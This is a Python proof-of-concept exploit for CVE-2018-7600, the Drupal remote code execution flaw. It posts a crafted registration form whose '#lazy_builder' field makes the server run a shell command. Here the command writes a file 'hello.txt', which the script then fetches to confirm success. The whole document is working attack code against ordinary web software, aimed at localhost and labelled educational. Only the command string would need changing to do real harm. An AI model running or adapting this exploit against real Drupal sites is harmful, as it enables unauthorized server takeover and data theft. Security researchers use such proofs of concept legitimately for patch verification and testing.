#!/usr/bin/env
import urllib.request
import urllib.parse

print ('################################################################')
print ('# Proof-Of-Concept for CVE-2018-7600')
print ('# by knqyf263')
print ('################################################################')
print ('Provided only for educational or information purposes\n')

TARGET = "http://127.0.0.1:8080/"

url = TARGET + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'echo vuln > hello.txt'}
data = urllib.parse.urlencode(payload).encode('utf-8')

try :
    request = urllib.request.Request(url, data)
    urllib.request.urlopen(request)
except:
    pass

response = urllib.request.urlopen(TARGET + "hello.txt")
if response.getcode() == 200:
    print("Success: Check {}".format(TARGET + "hello.txt"))
else:
    print("Fail")

